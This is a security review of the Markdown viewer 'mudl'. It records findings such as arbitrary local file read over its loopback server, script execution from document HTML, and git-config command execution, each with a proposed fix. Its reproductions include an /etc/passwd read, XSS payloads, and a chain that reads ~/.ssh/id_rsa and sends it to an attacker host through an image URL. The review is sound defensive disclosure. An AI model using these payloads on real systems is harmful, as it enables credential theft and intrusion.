# Security Review

A review of `mudl` as of `ebab3e7` (Phases 0–15 complete), covering all
eight crates in `crates/`, the bundled assets in `resources/`, and the
vendored third-party JavaScript.

Findings are ordered by severity. Each one states what the code does, why
it matters, and what a fix looks like. Nothing here has been fixed yet —
this document is the record of what was found, not a changelog.


## 1. Threat model

`mudl` opens Markdown files, and Markdown files are routinely untrusted:
a `README.md` from a freshly-cloned repository, a design doc downloaded
from the web, an attachment someone mailed over. **The document is the
attacker-controlled input**, and everything downstream of parsing it sits
inside the blast radius.

The relevant trust boundaries are:

- **The WebView's origin.** Each open document gets its own `mudl-server`
  instance on `127.0.0.1:<OS-assigned port>` and a `webkit2gtk::WebView`
  pointed at it (`crates/mudl-gui/src/window.rs`, `start_server_for`).
  Anything running as script on that origin can reach every route that
  server exposes.
- **The loopback socket itself.** The port is unpredictable but the
  server is unauthenticated, so any other process on the machine that
  finds the port is an equal peer to the WebView.
- **The user's filesystem.** `mudl` runs unsandboxed with the invoking
  user's full privileges.

That last point is the root of most of what follows. `docs/IMPLEMENTATION-PLAN.md`
§1 lists the macOS App Sandbox machinery (`AssetAccessStore`,
`LocalAssetProbe`, `BlockedAssetLog`, security-scoped bookmarks) as
permanently out of scope, on the grounds that "Linux has no default
sandbox denying file reads." That's true as a statement about Linux, but
the conclusion doesn't follow: upstream `mud` relies on the sandbox to
*contain* the behavior that Findings 2 and 3 below describe. Dropping the
sandbox without replacing it with in-app confinement moved that behavior
from contained to unconfined.


## 2. Arbitrary local file read over the HTTP server

**Severity: critical. Fixed.** Verified against a live server instance
prior to the fix.

`DocumentSource` now records the exact set of local paths each render of
the document resolved (`rewrite_local_image_srcs_with_paths` in
`crates/mudl-core/src/template.rs`), and `serve_local_file`
(`crates/mudl-server/src/server.rs`) refuses any `/local/<path>` request
whose path isn't in that set, before it ever reaches the `FileSystem`. A
request for `/local/%2Fetc%2Fpasswd` — or any other path the open document
didn't itself embed as an image — now gets the same 404 as a path that
doesn't exist, whether or not the file is actually present and readable.
The remaining two hardening steps from the original write-up (a per-instance
token in the `/local/` path, and rejecting requests with an unexpected
`Host` header) are not yet implemented; they would still be worth doing to
close the port-scanning and DNS-rebinding vectors against this and the
other routes.

The description below is preserved as the original record of what was
found.

`crates/mudl-server/src/routes.rs` maps `/local/<percent-encoded-path>` to
`Route::LocalFile`, and `serve_local_file` in
`crates/mudl-server/src/server.rs` passes the decoded string straight to
the injected `FileSystem` — which in production is `std::fs::read`
(`crates/mudl-server/src/fs.rs`, `RealFileSystem`). There is no
confinement of any kind: not to the document's directory, not to the
extensions `mudl_core::images::classify` recognizes, not to the set of
paths the document actually references.

There is also no authentication, and `handle_connection` reads only the
request line — headers are never parsed, so `Host` and `Origin` are never
checked.

A request sent to a real server instance:

```
GET /local/%2Fetc%2Fpasswd HTTP/1.1
Host: evil.example
Origin: https://evil.example

→ HTTP/1.1 200 OK
  Content-Type: application/octet-stream
  Content-Length: 1830

  root:x:0:0:root:/root:/bin/bash
  …
```

Note that the arbitrary `Host` was accepted. Two consequences:

- **Any local process or user** can scan loopback for the port and then
  read any file the `mudl` user can — `~/.ssh/id_rsa`,
  `~/.aws/credentials`, browser cookie databases, anything.
- **A remote web page** can do the same via DNS rebinding: point a
  hostname at `127.0.0.1`, and with no `Host` validation the browser
  treats the responses as same-origin with the attacker's page.

It is also the second half of the exploit chain in Finding 3.

**Fix.** The server already knows exactly which local paths a document
legitimately needs: `rewrite_local_image_srcs`
(`crates/mudl-core/src/template.rs`, called from
`crates/mudl-server/src/document.rs`) computes them while rendering.
Record that set on `DocumentSource` at render time and have
`serve_local_file` accept only paths in it, rather than accepting
free-form paths. Two further hardening steps, cheap and independent:

- Mint a random per-instance token when the server binds and require it
  in the path (`/local/<token>/<encoded>`), so a port scan alone isn't
  enough.
- Reject any request whose `Host` header isn't the bound
  `127.0.0.1:<port>`, which closes the DNS-rebinding path. This requires
  reading headers, which `handle_connection` currently skips.


## 3. Script execution from document content

**Severity: critical. Fixed** (the `script-src 'unsafe-inline'` and raw-HTML/
link-scheme pieces below; `img-src` is unchanged — see Finding 4, still
open). Verified against a live server instance and the CLI prior to the
fix.

`crate::html_sanitize::sanitize_html` (`crates/mudl-core/src/html_sanitize.rs`)
now runs over both raw-HTML pass-through sites in
`crates/mudl-core/src/render.rs` — `render_leaf`'s `Event::InlineHtml` arm
and `render_html_block`'s buffered `Event::Html` — dropping `<script>`,
`<iframe>`, `<object>`, and `<embed>` elements entirely (open tag, content,
and matching close tag), stripping every `on*` attribute from what's left,
and dropping any `href`/`src` attribute whose value isn't `http:`, `https:`,
`mailto:`, or scheme-less (`crate::html_sanitize::is_safe_url`). The same
`is_safe_url` check now gates `render_link`'s `href` (Markdown link syntax,
not just raw HTML), replacing a disallowed scheme with `#` — this is what
closes the `javascript:` link case, since that reaches the page through
`Tag::Link`, not raw HTML.

`crates/mudl-server/src/document.rs`'s `csp_script_src` is now `'self'`
only. The live-reload bootstrap that needed `'unsafe-inline'` for its
one-line `var MUDL_VERSION = N;` script now reads a `data-mudl-version`
attribute on the mode wrapper `<div>` instead (`resources/js/live-reload.js`),
so no inline script remains anywhere in the served page.

The description and reproduction below are preserved as the original
record of what was found.

Raw HTML in a Markdown document passes through the renderer verbatim:
`Event::InlineHtml` is pushed unescaped in `render_leaf`, and
`render_html_block` copies `Event::Html` payloads through the same way
(both in `crates/mudl-core/src/render.rs`). Link destinations are
HTML-escaped but their scheme is never filtered, so `javascript:` URLs
survive intact.

```
$ mudl -u xss.md
<h1 id="hi">Hi</h1>
<script>alert(1)</script>
<img src=x onerror="fetch(1)">
<p><a href="javascript:alert(2)">link</a></p>
```

The CSP the server ships with every page
(`crates/mudl-server/src/document.rs`) permits all of it:

```
default-src 'none'; img-src 'self' https: http: data:;
style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline';
connect-src 'self'
```

`'unsafe-inline'` is present only so the one-line
`var MUDL_VERSION = N;` bootstrap can run.

Put together, **opening a hostile document is enough** to:

1. run arbitrary JavaScript on the server's origin (`script-src
   'unsafe-inline'`);
2. read any file on disk with
   `fetch('/local/%2Fhome%2Fuser%2F.ssh%2Fid_rsa')` — same-origin, so
   `connect-src 'self'` permits it (Finding 2);
3. exfiltrate it with `new Image().src = 'https://evil/?d=' + btoa(data)`
   — `img-src http: https:` permits it.

No interaction beyond opening the file. A `javascript:` link reaches the
same place on a click: `crate::linkaction::classify` returns
`LinkAction::Default` for it (it is neither same-origin nor an
`is_external_source` scheme), so WebKit executes it in page context.

**Fix**, in order of leverage:

- Drop `'unsafe-inline'` from `script-src`. The version can travel as a
  `data-` attribute on `<body>` for `live-reload.js` to read, or behind a
  per-response nonce — either removes the need for it.
- Sanitize raw HTML rather than passing it through. At minimum: drop
  `<script>`, `<iframe>`, `<object>`, and `<embed>`; drop `on*`
  attributes; and allow only `http`, `https`, `mailto`, and `#` in `href`
  and `src`. `pulldown-cmark` hands these through as opaque text events,
  so the filtering has to happen in `render.rs`'s two pass-through sites.
- Tighten `img-src` to `'self' data:` (see Finding 4).

Upstream `mud` passes raw HTML through too, but inside the App Sandbox,
where step 2 has nothing to reach.


## 4. Remote images load unconditionally

**Severity: low**, but it contradicts a documented promise.

`img-src` includes `http:` and `https:`
(`crates/mudl-server/src/document.rs`), so a document can reference a
remote image and have it fetched the moment the file is opened. That's a
tracking beacon: it discloses the reader's IP address and the time they
opened the document, to whoever wrote it.

`README.md` currently states that syntax highlighting, Mermaid diagrams,
and math are "all rendered client-side, no network requests." The bundled
renderers do honor that; the image policy doesn't.

**Fix.** Narrow `img-src` to `'self' data:`. Local images already resolve
through the `/local/` route and data URIs are already used by
`--standalone`, so nothing in the feature set needs the remote schemes.
If remote images are wanted later, they belong behind an explicit
per-document opt-in.


## 5. Link clicks hand arbitrary local files to `xdg-open`

**Severity: medium.** Requires a click.

`rewrite_local_link_hrefs` routes every non-`.md` local link through
`/local-file/`, `crate::linkaction::classify` turns that into
`LinkAction::OpenWithSystemDefault`, and
`connect_link_navigation` in `crates/mudl-gui/src/window.rs` runs
`xdg-open <path>` on it with no confirmation and no check on what the
file is.

A hostile document ships `payload.desktop` (or a shell script with the
executable bit set) beside itself and labels the link "Appendix A". One
click launches it.

Interception is correctly scoped to `NavigationType::LinkClicked`, so
script-driven navigation can't reach this silently — the user has to
click. But a *viewer* is not an application a reader expects to launch
anything, so the click doesn't carry informed consent.

**Fix.** Either confirm the first `xdg-open` per document ("Open
`payload.desktop` with its default application?"), or restrict the
handoff to a known-inert extension set and leave everything else to an
explicit context-menu action.


## 6. "Changes since…" runs `git` inside an untrusted repository

**Severity: medium.** Requires a click.

`connect_changes_button` (`crates/mudl-gui/src/toolbar.rs`) calls
`mudl_diff::git::query_waypoints`, which runs the system `git` with
`current_dir` set to the document's own directory
(`RealGitRunner::run`, `crates/mudl-diff/src/git.rs`).

Git honors the repository's own `.git/config`, and several of its keys
name commands to execute — `core.fsmonitor` most directly. A repository
extracted from a downloaded archive is owned by the invoking user, so
`safe.directory` does not apply. Clicking "Changes since…" on a document
inside such a repository is enough to run whatever that config names.

The argument construction itself is clean: fixed `&[&str]` arrays, no
shell, `--` separators before every pathspec, and the two `git show`
arguments interpolate the relative path after a `:` or a commit hash, so
a leading `-` can't turn into an option. This is purely the ambient
git-config class of issue, not argument injection.

**Fix.** Don't run `git` in a directory the user hasn't explicitly
trusted. A per-repository trust prompt on first use is the conventional
shape; a narrower alternative is to skip the git integration entirely
when the repository's `.git/config` sets any command-valued key.


## 7. Atomic writes drop permissions and follow symlinks

**Severity: low-medium.**

Both `write_atomic` implementations — `crates/mudl-comments/src/write.rs`
and `crates/mudl-config/src/io.rs` — write a sibling temp file with
`std::fs::write` and then `rename` it over the target. Three consequences:

- **Permissions are lost.** The new file is created with the default mode
  (0644 after a typical umask), so a note the user had chmodded to 0600
  becomes world-readable the first time they add a comment to it.
- **Symlinks are replaced, not followed.** If the document is a symlink —
  common in dotfile and notes-vault setups — the rename replaces the
  symlink itself with a regular file, breaking the link.
- **The temp name is predictable.** `notes.md` always writes
  `notes.md.tmp` in the same directory. For a document in a
  shared-writable directory (`/tmp`), a local attacker can pre-create
  that name as a symlink to a file of their choosing and get
  `std::fs::write` to follow it — an arbitrary file write as the user.

**Fix.** `stat` the original before writing and restore its mode (and
ownership where possible) on the replacement; create the temp file with
`O_EXCL` and a random suffix rather than a fixed one; resolve the target
through symlinks before deciding where the temp file goes.


## 8. Smaller items

- **Unbounded request line** (`handle_connection`,
  `crates/mudl-server/src/server.rs`). `BufReader::read_line` has no size
  cap, so a local client that sends bytes without a newline grows the
  buffer until the process is out of memory. Thread-per-connection is
  likewise uncapped — the accept loop spawns without limit. Both are
  local-only denial of service, and both are cheap to bound.
- **`/local/` serves `.html` as `text/html`** (`crates/mudl-server/src/mime.rs`)
  on a response that carries no CSP — only the document route embeds the
  `<meta>` policy. Any HTML file on disk therefore becomes same-origin
  scriptable content. Responses also lack `X-Content-Type-Options:
  nosniff`. Both are moot once Finding 2 is confined, but worth fixing in
  the same pass.
- **`html_escape` doesn't escape `'`** (`crates/mudl-core/src/encoding.rs`).
  Safe today only because every attribute this codebase emits is
  double-quoted; it's a trap for whoever adds the first single-quoted one.
  Add `&#39;`.
- **CLI output is an unsanitized fragment.** `render_one`
  (`crates/mudl-cli/src/main.rs`) never emits a document wrapper, so
  `mudl -u` output carries no CSP at all while `<script>` and
  `javascript:` pass straight through (Finding 3). `README.md` advertises
  the CLI for terminal and script use; anyone rendering untrusted
  Markdown for publication inherits stored XSS. A `--sanitize` flag, or
  sanitizing by default with an opt-out, would close it. Separately and
  not a security issue: `--fragment`/`-f` is parsed in
  `crates/mudl-cli/src/args.rs` but never read by `render_one`, so it is
  currently a no-op.
- **Vendored JavaScript is pinned with no update path.**
  `resources/js/` carries highlight.js 11.9.0 (2023), Temml 0.13.3, and
  Mermaid 11.12.3. Both configurable renderers are configured correctly —
  Mermaid runs at its default `securityLevel: 'strict'` (DOMPurify
  sanitized) and Temml's `trust` defaults to false, so neither `\href`
  nor raw HTML labels are live. The concern is staleness: nothing in the
  build notices when one of these picks up a published advisory.


## 9. What was checked and found clean

For the record, so a later reviewer doesn't re-derive it:

- **No `unsafe` outside one audited site.** The only `unsafe` block is
  `pre_exec(|| { libc::setsid(); … })` in
  `crates/mudl-cli/src/main.rs`, which is a correct use of a
  post-fork/pre-exec hook.
- **No shell interpolation anywhere.** Every `Command::new` call site
  (`git`, `xdg-open`, the GUI re-exec) passes arguments as separate
  `arg`/`args` values.
- **Asset routing is an allowlist**, not a path lookup
  (`crates/mudl-server/src/assets.rs`), so `/assets/` has no traversal
  surface.
- **Host-side JavaScript is escaped.** Every `evaluate_javascript` call
  that embeds document-derived data (outline slugs, change group IDs,
  comment labels) routes it through
  `mudl_core::template::js_string_literal` first
  (`crates/mudl-gui/src/sidebar.rs`). Find-in-page uses WebKit's native
  `FindController` and interpolates nothing.
- **Comment labels are constrained** to `[A-Za-z0-9_-]`
  (`crates/mudl-comments/src/labels.rs`) *and* HTML-escaped at every
  emission site.
- **The server binds loopback only** — `TcpListener::bind("127.0.0.1:0")`.
- **No panics on hostile input.** 300 pathological documents (nested and
  unterminated delimiters, mixed encodings, embedded NULs, CRLF, astral
  plane characters) rendered through both `-u` and `-d` without a single
  panic, and the full suite of 815 tests passes.
